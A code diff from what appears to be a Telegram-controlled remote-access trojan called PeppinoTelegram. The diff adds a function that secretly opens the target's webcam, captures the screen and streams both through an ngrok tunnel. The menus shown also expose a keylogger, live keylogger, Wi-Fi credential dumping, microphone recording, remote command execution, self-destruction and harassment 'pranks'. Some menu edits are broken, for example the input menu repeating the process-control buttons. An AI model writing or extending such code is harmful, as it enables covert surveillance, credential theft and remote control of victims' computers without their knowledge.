@@ -8,7 +8,7 @@ If you lose control of your telegram bot, you could potentially lose the control
 """
 
 
-__version__ = "2.12.1"
+__version__ = "2.12.2"
 
 
 #TELEGRAM
@@ -264,6 +264,8 @@ webcamstreamstart - Sets you a link to a webcam stream.
 screenstreamstart - Sets you a link to a screen stream.
 webcamstreamstop - Stops the webcam stream.
 screenstreamstop - Stops the screen stream.
+webcamandscreenstreamstart - Sets you a link to a webcam&screen stream.
+webcamandscreenstreamstop - Sops the webcam&screen strea
 
 🔊 Audio & Volume
 breath - Play breathing sound.
@@ -621,6 +623,74 @@ class ScreenStreamHandler(BaseHTTPRequestHandler):
         else:
             self.send_error(404)
 
+def webcamandscreenstreamhandlermaker(cap):
+    class WebcamAndScreenStreamHandler(BaseHTTPRequestHandler):
+        def log_message(self, format, *args):
+            pass
+
+        def do_GET(self):
+            if self.path == '/':
+                html = b"""\
+                <!DOCTYPE html>
+                <html>
+                <head>
+                    <title>Webcam&Screen Stream</title>
+                    <style>
+                        body {
+                            background-color: #000;
+                            color: #fff;
+                            font-family: sans-serif;
+                            text-align: center;
+                            margin: 0;
+                            padding: 2em;
+                        }
+                        img {
+                            border: 6px solid #444;
+                            border-radius: 12px;
+                            width: 80%%;
+                            max-width: 960px;
+                            box-shadow: 0 0 20px #000;
+                        }
+                    </style>
+                </head>
+                <body>
+                    <h1>Live Webcam&Screen Stream</h1>
+                    <img src="/video" alt="Webcam stream">
+                </body>
+                </html>
+                """
+                self.send_response(200)
+                self.send_header('Content-type', 'text/html')
+                self.send_header('Content-length', str(len(html)))
+                self.end_headers()
+                self.wfile.write(html)
+
+            elif self.path == '/video':
+                cap.open(0)
+                self.send_response(200)
+                self.send_header('Content-type', 'multipart/x-mixed-replace; boundary=frame')
+                self.end_headers()
+                try:
+                    while cap.isOpened():
+                        img = pg.screenshot()
+                        img = np.array(img)
+                        img = cvtColor(img, COLOR_BGR2RGB)
+                        ret, frame = cap.read()
+                        fr_height, fr_width, _ = frame.shape
+                        frame = resize(frame, (fr_width//2, fr_height//2))
+                        fr_height, fr_width, _ = frame.shape
+                        img[0:fr_height, 0:fr_width, :] = frame[0:fr_height, 0:fr_width, :]
+                        if not ret:
+                            continue
+                        _, jpeg = imencode('.jpg', img)
+                        self.wfile.write(b"--frame\r\n")
+                        self.wfile.write(b"Content-Type: image/jpeg\r\n\r\n" + jpeg.tobytes() + b"\r\n")
+                except (BrokenPipeError, ConnectionResetError):
+                    pass
+            else:
+                self.send_error(404)
+    return WebcamAndScreenStreamHandler
+
 def webcamstreamhandlermaker(cap):
     class WebcamStreamHandler(BaseHTTPRequestHandler):
         def log_message(self, format, *args):
@@ -712,6 +782,12 @@ class TunnelManager:
 
     def start_webcam_stream(self, name="webcam", port=8082, cap=VideoCapture(0)):
         server = MJPEGServer(port, webcamstreamhandlermaker(cap))
+        url = server.start()
+        self.services[name] = server
+        return url
+
+    def start_webcam_and_screen_stream(self, name="webcamandscreen", port=8023, cap=VideoCapture(0)):
+        server = MJPEGServer(port, webcamandscreenstreamhandlermaker(cap))
         url = server.start()
         self.services[name] = server
         return url
@@ -1071,6 +1147,7 @@ class PeppinoTelegram:
 
         self.webcam_url = None
         self.screen_url = None
+        self.webcam_and_screen_url = None
 
         self.help = HELP
         self.process_killer_page = 0
@@ -1089,7 +1166,7 @@ class PeppinoTelegram:
         self.mouse_controller_menu = None
         self.processmonitormenu = None
         self.display_mode_keyboard  = None
-        self.main_menu_ref = None
+        self.mainmenu_ref = None
         self.wifidumper = WifiDumper()
         self.all_session_messages: list[int] = []
 
@@ -1151,6 +1228,8 @@ class PeppinoTelegram:
             "screenstreamstart":self.start_screen_tunnel,
             "webcamstreamstop":self.stop_webcam_tunnel,
             "screenstreamstop":self.stop_screen_tunnel,
+            "webcamandscreenstreamstart":self.start_webcam_and_screen_tunnel,
+            "webcamandscreenstreamstop":self.stop_webcam_and_screen_tunnel,
             "mixermenu":self.mixer_menu,
             "procmonadd":self.processmonitoradd,
             "procmonrem":self.processmonitorrem,
@@ -1165,7 +1244,7 @@ class PeppinoTelegram:
             "mousel":self.mousel,
             "mouseu":self.mouseu,
             "moused":self.moused,
-            "mainmenu":self.main_menu,
+            "mainmenu":self.mainmenu,
             "menu_system":self.menu_system,
             "menu_network":self.menu_network,
             "menu_camera":self.menu_camera,
@@ -1480,7 +1559,7 @@ class PeppinoTelegram:
             pg.moveTo(pos)
         bar.fill_and_delete()
 
-    def main_menu(self):
+    def mainmenu(self):
         buttons = {
             "🛑 System & Shutdown": "/menu_system",
             "🌐 Network & Remote Access": "/menu_network",
@@ -1494,172 +1573,185 @@ class PeppinoTelegram:
             "🧠 Keylogger": "/menu_keylogger",
             "🦑 Misc": "/menu_misc",
         }
-        if self.main_menu_ref:
-            self.main_menu_ref.delete()
-        self.main_menu_ref = self.new_menu(buttons, label="Select a category:", close_btn_lab="main_menu_close")
-        return self.main_menu_ref
+        if self.mainmenu_ref:
+            self.mainmenu_ref.delete()
+        self.mainmenu_ref = self.new_menu(buttons, label="Select a category:", close_btn_lab="mainmenu_close")
+        return self.mainmenu_ref
 
     def menu_system(self):
         buttons = {
-            "shutdown": "/shutdown",
-            "fakeshutdown": "/fakeshutdown",
-            "altf4": "/altf4",
-            "clear": "/clear",
-            "selfdestruction": "/selfdestruction",
-            "🔙 Back": "/main_menu"
+            "🔙 Back": "/mainmenu",
+            "🛑 Shutdown": "/shutdown",
+            "🎭 Fakeshutdown": "/fakeshutdown",
+            "⌨️ Altf4": "/altf4",
+            "🧹 Clear": "/clear",
+            "💣 Selfdestruction": "/selfdestruction",
         }
-        if self.main_menu_ref:
-            self.main_menu_ref.delete()
-        self.main_menu_ref = self.new_menu(buttons, label="🛑 System & Shutdown", close_btn_lab="main_menu_close")
-        return self.main_menu_ref
+        if self.mainmenu_ref:
+            self.mainmenu_ref.delete()
+        self.mainmenu_ref = self.new_menu(buttons, label="🛑 System & Shutdown", close_btn_lab="mainmenu_close")
+        return self.mainmenu_ref
 
     def menu_network(self):
         buttons = {
-            "wifiinfo": "/wifiinfo",
-            "getip": "/getip",
-            "🔙 Back": "/main_menu"
+            "🔙 Back": "/mainmenu",
+            "📶 Wifiinfo": "/wifiinfo",
+            "🌐 Getip": "/getip",
         }
-        if self.main_menu_ref:
-            self.main_menu_ref.delete()
-        self.main_menu_ref = self.new_menu(buttons, label="🌐 Network & Remote Access", close_btn_lab="main_menu_close")
-        return self.main_menu_ref
+
+        if self.mainmenu_ref:
+            self.mainmenu_ref.delete()
+        self.mainmenu_ref = self.new_menu(buttons, label="🌐 Network & Remote Access", close_btn_lab="mainmenu_close")
+        return self.mainmenu_ref
 
     def menu_camera(self):
         buttons = {
-            "selfie": "/selfie",
-            "screenshot": "/screenshot",
-            "fullclip": "/fullclip",
-            "webcamclip": "/webcamclip",
-            "screenclip": "/screenclip",
-            "recordjum": "/recordjum",
-            "waitforface": "/waitforface",
-            "displaymode": "/displaymode",
-            "webcamstreamstart": "/webcamstreamstart",
-            "screenstreamstart": "/screenstreamstart",
-            "webcamstreamstop": "/webcamstreamstop",
-            "screenstreamstop": "/screenstreamstop",
-            "🔙 Back": "/main_menu"
+            "🔙 Back": "/mainmenu",
+            "🤳 Selfie": "/selfie",
+            "📸 Screenshot": "/screenshot",
+            "🎞️ Fullclip": "/fullclip",
+            "🎥 Webcamclip": "/webcamclip",
+            "🖥️ Screenclip": "/screenclip",
+            "🎙️ Recordjum": "/recordjum",
+            "⏳ Waitforface": "/waitforface",
+            "🖼️ Displaymode": "/displaymode",
+            "📷🟢 Webcamstreamstart": "/webcamstreamstart",
+            "🖥️🟢 Screenstreamstart": "/screenstreamstart",
+            "📷🔴 Webcamstreamstop": "/webcamstreamstop",
+            "🖥️🔴 Screenstreamstop": "/screenstreamstop",
+            "📷🖥️🟢 Webcamandscreenstreamstart": "/webcamandscreenstreamstart",
+            "📷🖥️🔴 Webcamandscreenstreamstop": "/webcamandscreenstreamstop",
         }
-        if self.main_menu_ref:
-            self.main_menu_ref.delete()
-        self.main_menu_ref = self.new_menu(buttons, label="📸 Camera & Screen", next_btn=True, close_btn_lab="main_menu_close")
-        return self.main_menu_ref
+
+        if self.mainmenu_ref:
+            self.mainmenu_ref.delete()
+        self.mainmenu_ref = self.new_menu(buttons, label="📸 Camera & Screen", next_btn=True, close_btn_lab="mainmenu_close")
+        return self.mainmenu_ref
 
     def menu_audio(self):
         buttons = {
-            "breath": "/breath",
-            "pss": "/pss",
-            "microphone": "/microphone",
-            "mutevolume": "/mutevolume",
-            "fullvolume": "/fullvolume",
-            "setvolume": "/setvolume",
-            "getvolume": "/getvolume",
-            "tralalerotralala": "/tralalerotralala",
-            "mixermenu": "/mixermenu",
-            "🔙 Back": "/main_menu"
+            "🔙 Back": "/mainmenu",
+            "💨 Breath": "/breath",
+            "📢 Pss": "/pss",
+            "🎙️ Microphone": "/microphone",
+            "🔇 Mutevolume": "/mutevolume",
+            "🔊 Fullvolume": "/fullvolume",
+            "🎚️ Setvolume": "/setvolume",
+            "📈 Getvolume": "/getvolume",
+            "🎶 Tralalerotralala": "/tralalerotralala",
+            "🎛️ Mixermenu": "/mixermenu",
         }
-        if self.main_menu_ref:
-            self.main_menu_ref.delete()
-        self.main_menu_ref = self.new_menu(buttons, label="🔊 Audio & Volume", next_btn=True, close_btn_lab="main_menu_close")
-        return self.main_menu_ref
+
+        if self.mainmenu_ref:
+            self.mainmenu_ref.delete()
+        self.mainmenu_ref = self.new_menu(buttons, label="🔊 Audio & Volume", next_btn=True, close_btn_lab="mainmenu_close")
+        return self.mainmenu_ref
 
     def menu_pranks(self):
         buttons = {
-            "jumpscare": "/jumpscare",
-            "jumpscarenoaudio": "/jumpscarenoaudio",
-            "invertedscreen": "/invertedscreen",
-            "distortedscreen": "/distortedscreen",
-            "messagebox": "/messagebox",
-            "messagespam": "/messagespam",
-            "camerawallpaper": "/camerawallpaper",
-            "setvideowallpaper": "/setvideowallpaper",
-            "🔙 Back": "/main_menu"
+            "🔙 Back": "/mainmenu",
+            "👻 Jumpscare": "/jumpscare",
+            "😶‍🌫️ Jumpscarenoaudio": "/jumpscarenoaudio",
+            "🔄 Invertedscreen": "/invertedscreen",
+            "🌀 Distortedscreen": "/distortedscreen",
+            "💬 Messagebox": "/messagebox",
+            "📨 Messagespam": "/messagespam",
+            "📷 Camerawallpaper": "/camerawallpaper",
+            "🎞️ Setvideowallpaper": "/setvideowallpaper",
         }
-        if self.main_menu_ref:
-            self.main_menu_ref.delete()
-        self.main_menu_ref = self.new_menu(buttons, label="😈 Pranks & Visuals", next_btn=True, close_btn_lab="main_menu_close")
-        return self.main_menu_ref
+
+        if self.mainmenu_ref:
+            self.mainmenu_ref.delete()
+        self.mainmenu_ref = self.new_menu(buttons, label="😈 Pranks & Visuals", next_btn=True, close_btn_lab="mainmenu_close")
+        return self.mainmenu_ref
 
     def menu_control(self):
         buttons = {
+            "🔙 Back": "/mainmenu",
             "execute": "/execute",
             "processkiller": "/processkiller",
             "terminateprocess": "/terminateprocess",
             "procmonmenu": "/procmonmenu",
             "procmonadd": "/procmonadd",
             "procmonrem": "/procmonrem",
-            "🔙 Back": "/main_menu"
         }
-        if self.main_menu_ref:
-            self.main_menu_ref.delete()
-        self.main_menu_ref = self.new_menu(buttons, label="💻 System Control", close_btn_lab="main_menu_close")
-        return self.main_menu_ref
+        if self.mainmenu_ref:
+            self.mainmenu_ref.delete()
+        self.mainmenu_ref = self.new_menu(buttons, label="💻 System Control", close_btn_lab="mainmenu_close")
+        return self.mainmenu_ref
 
     def menu_input(self):
         buttons = {
-            "randomkeyboard": "/randomkeyboard",
-            "capslock": "/capslock",
-            "mousecontroller": "/mousecontroller",
-            "mouselock": "/mouselock",
-            "🔙 Back": "/main_menu"
+            "🔙 Back": "/mainmenu",
+            "⚙️ Execute": "/execute",
+            "🔪 Processkiller": "/processkiller",
+            "🛑 Terminateprocess": "/terminateprocess",
+            "📋 Procmonmenu": "/procmonmenu",
+            "➕ Procmonadd": "/procmonadd",
+            "➖ Procmonrem": "/procmonrem",
         }
-        if self.main_menu_ref:
-            self.main_menu_ref.delete()
-        self.main_menu_ref = self.new_menu(buttons, label="🎮 Input / Device Control", close_btn_lab="main_menu_close")
-        return self.main_menu_ref
+
+        if self.mainmenu_ref:
+            self.mainmenu_ref.delete()
+        self.mainmenu_ref = self.new_menu(buttons, label="🎮 Input / Device Control", close_btn_lab="mainmenu_close")
+        return self.mainmenu_ref
 
     def menu_messaging(self):
         buttons = {
-            "bsend": "/bsend",
-            "id": "/id",
-            "deletemessages": "/deletemessages",
-            "deleteallmessages": "/deleteallmessages",
-            "🔙 Back": "/main_menu"
+            "🔙 Back": "/mainmenu",
+            "📤 Bsend": "/bsend",
+            "🆔 Id": "/id",
+            "❌ Deletemessages": "/deletemessages",
+            "🗑️ Deleteallmessages": "/deleteallmessages",
         }
-        if self.main_menu_ref:
-            self.main_menu_ref.delete()
-        self.main_menu_ref = self.new_menu(buttons, label="📋 Messaging", close_btn_lab="main_menu_close")
-        return self.main_menu_ref
+
+        if self.mainmenu_ref:
+            self.mainmenu_ref.delete()
+        self.mainmenu_ref = self.new_menu(buttons, label="📋 Messaging", close_btn_lab="mainmenu_close")
+        return self.mainmenu_ref
 
     def menu_cantopen(self):
         buttons = {
-            "cantopenadd": "/cantopenadd",
-            "cantopenremove": "/cantopenremove",
-            "cantopenmenu": "/cantopenmenu",
-            "🔙 Back": "/main_menu"
+            "🔙 Back": "/mainmenu",
+            "🚫 Cantopenadd": "/cantopenadd",
+            "❌ Cantopenremove": "/cantopenremove",
+            "📋 Cantopenmenu": "/cantopenmenu",
         }
-        if self.main_menu_ref:
-            self.main_menu_ref.delete()
-        self.main_menu_ref = self.new_menu(buttons, label="🔒 Can't Open List", close_btn_lab="main_menu_close")
-        return self.main_menu_ref
+
+        if self.mainmenu_ref:
+            self.mainmenu_ref.delete()
+        self.mainmenu_ref = self.new_menu(buttons, label="🔒 Can't Open List", close_btn_lab="mainmenu_close")
+        return self.mainmenu_ref
 
     def menu_keylogger(self):
         buttons = {
-            "keylogger": "/keylogger",
-            "livekeylogger": "/livekeylogger",
-            "🔙 Back": "/main_menu"
+            "🔙 Back": "/mainmenu",
+            "⌨️ Keylogger": "/keylogger",
+            "📡 Livekeylogger": "/livekeylogger",
         }
-        if self.main_menu_ref:
-            self.main_menu_ref.delete()
-        self.main_menu_ref = self.new_menu(buttons, label="🧠 Keylogger", close_btn_lab="main_menu_close")
-        return self.main_menu_ref
+
+        if self.mainmenu_ref:
+            self.mainmenu_ref.delete()
+        self.mainmenu_ref = self.new_menu(buttons, label="🧠 Keylogger", close_btn_lab="mainmenu_close")
+        return self.mainmenu_ref
 
     def menu_misc(self):
         buttons = {
-            "plankton": "/plankton",
-            "planktonnoaudio": "/planktonnoaudio",
-            "johnpork": "/johnpork",
-            "johnporknoaudio": "/johnporknoaudio",
-            "gabinetti": "/gabinetti",
-            "duckyscript": "/duckyscript",
-            "duckyhelp": "/duckyhelp",
-            "browser": "/browser",
-            "🔙 Back": "/main_menu"
+            "🔙 Back": "/mainmenu",
+            "🦑 Plankton": "/plankton",
+            "🔇 Planktonnoaudio": "/planktonnoaudio",
+            "🐷 Johnpork": "/johnpork",
+            "🔕 Johnporknoaudio": "/johnporknoaudio",
+            "🛋️ Gabinetti": "/gabinetti",
+            "⌨️ Duckyscript": "/duckyscript",
+            "❓ Duckyhelp": "/duckyhelp",
+            "🌐 Browser": "/browser",
         }
-        if self.main_menu_ref:
-            self.main_menu_ref.delete()
-        self.main_menu_ref = self.new_menu(buttons, label="🦑 Misc", next_btn=True, close_btn_lab="main_menu_close")
-        return self.main_menu_ref
+
+        if self.mainmenu_ref:
+            self.mainmenu_ref.delete()
+        self.mainmenu_ref = self.new_menu(buttons, label="🦑 Misc", next_btn=True, close_btn_lab="mainmenu_close")
+        return self.mainmenu_ref
 
     def new_editable_message(self, content: str, autosend: bool=True) -> EditableMessage:
         editable = EditableMessage(self.bot, self.owner_id, content, autosend)
@@ -1768,10 +1860,10 @@ class PeppinoTelegram:
                     self.processmonitormenu.delete()
                     self.processmonitormenushow()
 
-        elif command.startswith("main_menu"):
-            if self.main_menu_ref:
-                if command == "main_menu_close":
-                    self.main_menu_ref.delete()
+        elif command.startswith("mainmenu"):
+            if self.mainmenu_ref:
+                if command == "mainmenu_close":
+                    self.mainmenu_ref.delete()
 
         else:
             self.bsend(f"Invalid command {command}")
@@ -1918,8 +2010,8 @@ class PeppinoTelegram:
             self.process_explorer_menu.delete()
             self.process_killer_page = page
         processes = [x.name() for x in psutil.process_iter()] 
-        self.process_explorer_menu = self.new_menu({process:f"/terminateprocess {process}" for process in processes}, next_btn=True, autosend=False, page=self.process_killer_page, next_btn_lab="PK_next_page", prev_btn_lab="PK_previous_page", close_btn_lab="PK_close_page", rows=3)
-        return self.process_explorer_menu.send_keyboard()
+        self.process_explorer_menu = self.new_menu({process:f"/terminateprocess {process}" for process in processes}, next_btn=True, autosend=True, page=self.process_killer_page, next_btn_lab="PK_next_page", prev_btn_lab="PK_previous_page", close_btn_lab="PK_close_page", rows=3)
+        return self.process_explorer_menu
 
     def pss(self) -> None:
         self.__play_loaded_sound("pss")
@@ -2247,6 +2339,14 @@ class PeppinoTelegram:
             sp_win = Thread(target=self.message_box, args=["Warning", text,])
             sp_win.start()
     
+    def stop_webcam_and_screen_tunnel(self) -> None:
+        if self.webcam_and_screen_url:
+            self.tunnelhandler.stop_service("webcamandscreen")
+            self.webcam_and_screen_url = None
+            self.bsend(f"{emoji_dict['photo']}{emoji_dict['screen']} Screen tunnel closed")
+        else:
+            self.bsend(f"{emoji_dict['photo']}{emoji_dict['screen']} You have no screen tunnel opened")
+    
     def stop_webcam_tunnel(self) -> None:
         if self.webcam_url:
             self.closecap()
@@ -2263,6 +2363,17 @@ class PeppinoTelegram:
             self.bsend(f"{emoji_dict['screen']} Screen tunnel closed")
         else:
             self.bsend(f"{emoji_dict['screen']} You have no screen tunnel opened")
+
+    def start_webcam_and_screen_tunnel(self) -> None:
+        if self.can_use_ngrok and self.webcam_and_screen_url is None:
+            self.webcam_and_screen_url = self.tunnelhandler.start_webcam_and_screen_stream(cap=self.cap)
+            self.bsend(f"{emoji_dict['photo']}{emoji_dict['screen']} Webcam&Screen Tunnel url: {self.webcam_and_screen_url}")
+
+        elif self.can_use_ngrok and not(self.webcam_and_screen_url is None):
+            self.bsend(f"{emoji_dict['photo']}{emoji_dict['screen']} Webcam&Screen Tunnel url: {self.webcam_and_screen_url}")
+
+        else:
+            self.bsend("You cant use tunnel because you didn't provide a ngrok token.")
 
     def start_webcam_tunnel(self) -> None:
         if self.can_use_ngrok and self.webcam_url is None:
